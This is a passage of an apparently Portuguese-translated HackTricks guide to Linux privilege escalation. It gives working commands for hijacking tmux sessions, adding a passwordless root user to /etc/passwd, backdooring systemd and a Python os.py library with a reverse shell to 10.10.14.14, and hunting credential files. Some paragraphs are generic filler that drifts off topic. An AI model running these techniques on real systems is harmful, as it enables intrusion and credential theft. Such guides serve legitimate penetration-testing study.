tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Verifique **Valentine box do HTB** para um exemplo.

## SSH

### Debian OpenSSL PRNG Previsível - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu, etc) entre setembro de 2006 e 13 de maio de 2008 podem ser afetadas por esse bug.\
Esse bug ocorre ao criar uma nova chave ssh nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e **com a chave pública ssh você pode procurar pela chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuração interessantes do SSH

* **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
* **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
* **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite o login em contas com strings de senha vazias. O padrão é `no`.

### PermitRootLogin

Especifica se o root pode fazer login usando ssh, o padrão é `no`. Valores possíveis:

* `yes`: root pode fazer login usando senha e chave privada
* `without-password` ou `prohibit-password`: root só pode fazer login com uma chave privada
* `forced-commands-only`: Root só pode fazer login usando chave privada e se as opções de comandos forem especificadas
* `no` : não

### AuthorizedKeysFile

Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do diretório home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **privada** do usuário "**testusername**", o ssh irá comparar a chave pública da sua chave com aquelas localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite que você **use suas chaves SSH locais em vez de deixar as chaves** (sem frases de acesso!) no seu servidor. Assim, você poderá **pular** via ssh **para um host** e a partir daí **pular para outro** host **usando** a **chave** localizada no seu **host inicial**.

Você precisa definir essa opção em `$HOME/.ssh.config` da seguinte forma:
```
Host example.com
ForwardAgent yes
```
Observe que se `Host` for `*`, toda vez que o usuário pular para uma máquina diferente, essa máquina poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você descobrir que o encaminhamento do agente está configurado em um ambiente, leia a seguinte página, pois **você pode conseguir explorá-lo para elevar privilégios**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Arquivos Interessantes

### Arquivos de Perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá elevar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, é recomendado **encontrar todos eles** e **verificar se você pode lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **hashes de senhas** dentro do arquivo `/etc/passwd` (ou equivalente).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Em seguida, adicione o usuário `hacker` e adicione a senha gerada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as seguintes linhas para adicionar um usuário fictício sem senha.\
ATENÇÃO: você pode comprometer a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nas plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, além disso, o `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/**, então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o tomcat for iniciado.

### Verificar Pastas

As seguintes pastas podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização Estranha/Arquivos Possuídos

#### Descrição

Uma técnica comum de escalonamento de privilégios é explorar arquivos localizados em locais incomuns ou arquivos possuídos por usuários privilegiados. Essa abordagem visa encontrar arquivos que possam ser manipulados para obter acesso privilegiado ao sistema.

#### Detalhes

1. **Arquivos SUID/SGID**: Esses arquivos possuem permissões especiais que permitem que sejam executados com os privilégios do proprietário ou do grupo. Ao encontrar um arquivo SUID/SGID, um invasor pode explorar uma vulnerabilidade no arquivo para executar comandos com privilégios elevados. Alguns exemplos comuns de arquivos SUID/SGID são `sudo`, `passwd` e `ping`.

2. **Arquivos de configuração**: Muitos aplicativos e serviços têm arquivos de configuração que podem conter informações sensíveis ou serem manipulados para obter acesso privilegiado. Ao explorar esses arquivos, um invasor pode encontrar senhas, chaves de API ou outras informações confidenciais que podem ser usadas para obter acesso privilegiado.

3. **Arquivos de log**: Os arquivos de log podem conter informações úteis para um invasor, como senhas digitadas incorretamente ou comandos executados com privilégios elevados. Ao analisar os arquivos de log, um invasor pode encontrar informações que podem ser usadas para obter acesso privilegiado.

4. **Arquivos de backup**: Os arquivos de backup geralmente são negligenciados e podem conter informações sensíveis ou serem manipulados para obter acesso privilegiado. Um invasor pode explorar arquivos de backup mal protegidos para obter acesso privilegiado ao sistema.

#### Mitigação

Para mitigar os riscos associados a essa técnica de escalonamento de privilégios, as seguintes medidas podem ser implementadas:

1. **Remover permissões desnecessárias**: Revise as permissões dos arquivos SUID/SGID e remova as permissões desnecessárias. Certifique-se de que apenas os arquivos essenciais tenham essas permissões especiais.

2. **Proteger arquivos de configuração**: Verifique se os arquivos de configuração são protegidos adequadamente e não contêm informações sensíveis. Restrinja as permissões de acesso a esses arquivos para evitar manipulações indesejadas.

3. **Monitorar arquivos de log**: Implemente um sistema de monitoramento de log eficaz para detectar atividades suspeitas nos arquivos de log. Analise regularmente os logs em busca de atividades incomuns ou tentativas de acesso privilegiado.

4. **Proteger arquivos de backup**: Certifique-se de que os arquivos de backup sejam armazenados em locais seguros e protegidos adequadamente. Restrinja o acesso a esses arquivos e verifique regularmente sua integridade.

Ao implementar essas medidas, é possível reduzir significativamente o risco de escalonamento de privilégios por meio de arquivos localizados em locais incomuns ou arquivos possuídos por usuários privilegiados.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos

To identify recently modified files on a Linux system, you can use the `find` command along with the `-mmin` option. This option allows you to specify the number of minutes ago that the file was modified.

```bash
find / -type f -mmin -5
```

This command will search for all regular files (`-type f`) on the entire system (`/`) that were modified within the last 5 minutes (`-mmin -5`).

You can adjust the `-5` value to match the desired time frame. For example, if you want to find files modified within the last 10 minutes, you can use `-mmin -10`.

Keep in mind that this command may take some time to complete, as it searches the entire system. Additionally, you may need root privileges to search certain directories.

By using this command, you can quickly identify any recently modified files, which can be useful for investigating suspicious activity or detecting unauthorized changes on your system.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos de Banco de Dados Sqlite

Sqlite é um sistema de gerenciamento de banco de dados leve e amplamente utilizado. Muitos aplicativos, incluindo aqueles em dispositivos móveis, usam arquivos de banco de dados Sqlite para armazenar informações.

Esses arquivos de banco de dados podem conter dados confidenciais, como senhas, informações de login e outros dados sensíveis. Portanto, eles podem ser um alvo atraente para um hacker em busca de informações valiosas.

Ao realizar um teste de penetração ou uma auditoria de segurança, é importante procurar por arquivos de banco de dados Sqlite em um sistema. Esses arquivos podem ser encontrados em várias localizações, como diretórios de aplicativos, pastas de configuração e até mesmo em arquivos de backup.

Uma vez que um arquivo de banco de dados Sqlite é obtido, um hacker pode explorar várias técnicas de escalonamento de privilégios para obter acesso a informações confidenciais ou executar comandos maliciosos no sistema.

É essencial que os administradores de sistemas protejam adequadamente os arquivos de banco de dados Sqlite, garantindo que apenas usuários autorizados tenham acesso a eles e que sejam implementadas medidas de segurança adequadas, como criptografia e autenticação forte.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Arquivos \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos

Os arquivos ocultos são arquivos que começam com um ponto (.) no início do nome do arquivo. Esses arquivos são ocultos por padrão no sistema operacional Linux. Eles são usados para armazenar configurações e informações importantes que não devem ser modificadas ou excluídas acidentalmente pelos usuários.

Os arquivos ocultos podem conter informações sensíveis, como senhas, chaves de criptografia e outras informações confidenciais. Portanto, é importante ter cuidado ao lidar com esses arquivos e garantir que apenas usuários autorizados tenham acesso a eles.

Ao realizar uma análise de segurança ou um teste de penetração em um sistema Linux, é importante verificar se existem arquivos ocultos que possam conter informações valiosas para um invasor. Isso pode ser feito usando comandos como `ls -a` para listar todos os arquivos, incluindo os ocultos, ou `find / -name ".*"` para procurar arquivos ocultos em todo o sistema de arquivos.

Ao encontrar um arquivo oculto suspeito, é importante examiná-lo cuidadosamente para determinar seu conteúdo e se ele representa uma ameaça à segurança do sistema. Isso pode envolver a análise do conteúdo do arquivo usando um editor de texto ou a execução de comandos específicos para examinar seu conteúdo.

Em resumo, os arquivos ocultos são uma parte importante da segurança do sistema Linux e devem ser tratados com cuidado. Ao realizar uma análise de segurança, é essencial verificar a presença de arquivos ocultos que possam conter informações sensíveis ou representar uma ameaça à segurança do sistema.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binários no PATH**

Um método comum de escalonamento de privilégios é explorar scripts ou binários que estão localizados no diretório PATH do sistema. O diretório PATH é uma lista de diretórios em que o sistema procura por comandos executáveis. Se um usuário mal-intencionado conseguir substituir um script ou binário legítimo por um malicioso e esse script ou binário for executado por um usuário com privilégios elevados, o atacante poderá obter acesso privilegiado ao sistema.

Para evitar esse tipo de ataque, é importante garantir que apenas scripts e binários confiáveis estejam presentes no diretório PATH. Isso pode ser feito seguindo as práticas recomendadas de segurança, como:

- Limitar as permissões de gravação nos diretórios do PATH para usuários privilegiados.
- Verificar regularmente a integridade dos scripts e binários no PATH em busca de alterações não autorizadas.
- Utilizar assinaturas digitais para verificar a autenticidade dos scripts e binários.
- Manter os sistemas atualizados com as últimas correções de segurança para evitar vulnerabilidades conhecidas.

Ao adotar essas medidas de segurança, é possível reduzir significativamente o risco de escalonamento de privilégios por meio de scripts ou binários no PATH.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Arquivos da Web**

Web files are an essential part of any website or web application. They contain the code, scripts, stylesheets, and other resources that make up the visual and functional elements of a website. These files are typically stored on a web server and are accessible to users through a web browser.

Web files can include HTML files, CSS files, JavaScript files, image files, video files, audio files, and more. Each file serves a specific purpose in the overall structure and functionality of a website.

When it comes to web security, it is important to properly secure and protect these files to prevent unauthorized access or tampering. This includes implementing proper file permissions, using secure protocols for file transfer, and regularly updating and patching any vulnerabilities in the software or frameworks used to build the website.

By following best practices for web file security, you can help ensure the integrity and confidentiality of your website's data and protect against potential attacks or data breaches.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Cópias de Segurança**

As cópias de segurança são uma parte essencial da segurança de dados. Elas garantem que os dados importantes sejam protegidos contra perda ou corrupção. É importante implementar uma estratégia de backup adequada para garantir a recuperação dos dados em caso de falhas ou incidentes de segurança.

Existem várias práticas recomendadas para realizar cópias de segurança eficientes:

- **Frequência**: As cópias de segurança devem ser realizadas regularmente, de acordo com a frequência de alterações nos dados. Isso pode variar de acordo com a natureza dos dados e a importância deles.

- **Armazenamento seguro**: As cópias de segurança devem ser armazenadas em um local seguro, protegido contra acesso não autorizado e desastres naturais. Isso pode incluir o uso de armazenamento em nuvem, dispositivos externos ou servidores dedicados.

- **Testes de recuperação**: É importante testar regularmente a recuperação dos dados a partir das cópias de segurança para garantir que elas estejam funcionando corretamente. Isso ajuda a identificar e corrigir quaisquer problemas antes que ocorra uma perda real de dados.

- **Criptografia**: Para garantir a confidencialidade dos dados durante o armazenamento e a transferência, é recomendado criptografar as cópias de segurança. Isso impede que terceiros não autorizados acessem ou manipulem os dados.

- **Monitoramento**: É importante monitorar o processo de backup para garantir que ele esteja sendo executado corretamente e que todas as etapas estejam sendo concluídas com sucesso. Isso pode ser feito por meio de logs e alertas automatizados.

Ao implementar uma estratégia de backup eficiente, você pode garantir a segurança e a disponibilidade dos seus dados, minimizando o risco de perda ou corrupção.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para fazer isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que é um aplicativo de código aberto usado para recuperar muitas senhas armazenadas em um computador local para Windows, Linux e Mac.

### Logs

Se você pode ler logs, pode ser capaz de encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho o log, mais interessante ele será (provavelmente).\
Além disso, alguns logs de auditoria "**ruins**" configurados (com backdoor?) podem permitir que você **registre senhas** dentro dos logs de auditoria, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs do grupo** [**adm**](interesting-groups-linux-pe/#grupo-adm) será realmente útil.

### Arquivos Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Busca Genérica de Credenciais/Regex

Você também deve verificar arquivos que contenham a palavra "**password**" em seu **nome** ou dentro do **conteúdo**, e também verificar IPs e emails dentro de logs, ou expressões regulares de hashes.\
Não vou listar aqui como fazer tudo isso, mas se você estiver interessado, pode verificar as últimas verificações que o [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos Graváveis

### Sequestro de Biblioteca Python

Se você souber de **onde** um script python será executado e você **puder escrever dentro** dessa pasta ou **modificar bibliotecas python**, você pode modificar a biblioteca do sistema operacional e inserir um backdoor (se você puder escrever onde o script python será executado, copie e cole a biblioteca os.py).

Para **inserir o backdoor na biblioteca**, basta adicionar no final do arquivo os.py a seguinte linha (altere o IP e a PORTA):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do Logrotate

Existe uma vulnerabilidade no `logrotate` que permite a um usuário com **permissões de escrita sobre um arquivo de log** ou **qualquer um** de seus **diretórios pai** escrever **um arquivo em qualquer localização**. Se o **logrotate** estiver sendo executado pelo **root**, então o usuário poderá escrever qualquer arquivo em _**/etc/bash\_completion.d/**_ que será executado por qualquer usuário que fizer login.\
Portanto, se você tiver **permissões de escrita** sobre um **arquivo de log** **ou** qualquer um de seus **diretórios pai**, você pode **elevar privilégios** (na maioria das distribuições Linux, o logrotate é executado automaticamente uma vez por dia como **usuário root**). Além disso, verifique se além de _/var/log_ existem mais arquivos sendo **rotacionados**.

{% hint style="info" %}
Essa vulnerabilidade afeta a versão `3.18.0` e anteriores do `logrotate`
{% endhint %}

Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com o [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx)**, então sempre que você descobrir que pode alterar logs, verifique quem está gerenciando esses logs e verifique se você pode elevar privilégios substituindo os logs por links simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<qualquer_coisa>` em _/etc/sysconfig/network-scripts_ **ou** ajustar um existente, então seu **sistema está comprometido**.

Os scripts de rede, como _ifcg-eth0_, por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se você tiver **espaço em branco no nome, o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**Referência de vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd e rc.d**

`/etc/init.d` contém **scripts** usados pelas ferramentas de inicialização do System V (SysVinit). Este é o **pacote tradicional de gerenciamento de serviços para Linux**, contendo o programa `init` (o primeiro processo que é executado quando o kernel termina de inicializar¹) e alguma infraestrutura para iniciar e parar serviços e configurá-los. Especificamente, os arquivos em `/etc/init.d` são scripts de shell que respondem aos comandos `start`, `stop`, `restart` e (quando suportado) `reload` para gerenciar um serviço específico. Esses scripts podem ser invocados diretamente ou (mais comumente) por algum outro gatilho (geralmente a presença de um link simbólico em `/etc/rc?.d/`). (De [aqui](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)). Outra alternativa para esta pasta é `/etc/rc.d/init.d` no Redhat.

`/etc/init` contém arquivos de **configuração** usados pelo **Upstart**. Upstart é um **pacote de gerenciamento de serviços** jovem defendido pelo Ubuntu. Os arquivos em `/etc/init` são arquivos de configuração que informam ao Upstart como e quando `start`, `stop`, `reload` a configuração ou consultar o `status` de um serviço. A partir do lucid, o Ubuntu está fazendo a transição do SysVinit para o Upstart, o que explica por que muitos serviços vêm com scripts SysVinit, mesmo que os arquivos de configuração do Upstart sejam preferidos. Os scripts SysVinit são processados por uma camada de compatibilidade no Upstart. (De [aqui](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)).

**systemd** é um **sistema de inicialização e gerenciador de serviços do Linux que inclui recursos como inicialização sob demanda de daemons**, manutenção de pontos de montagem e automontagem, suporte a snapshots e rastreamento de processos usando grupos de controle do Linux. O systemd fornece um daemon de registro e outras ferramentas e utilitários para ajudar nas tarefas comuns de administração do sistema. (De [aqui](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).

Arquivos que são enviados em pacotes baixados do repositório de distribuição são colocados em `/usr/lib/systemd/`. Modificações feitas pelo administrador do sistema (usuário) são colocadas em `/etc/systemd/system/`.

## Outros Truques

### Escalação de privilégios NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Escapando de Shells restritas

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Proteções de Segurança do Kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Binários estáticos do impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Ferramentas de Escalação de Privilégios Linux/Unix

### **Melhor ferramenta para procurar vetores de escalonamento de privilégios locais no Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opção -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerar vulnerabilidades do kernel no Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilação de mais scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referências

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com).
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
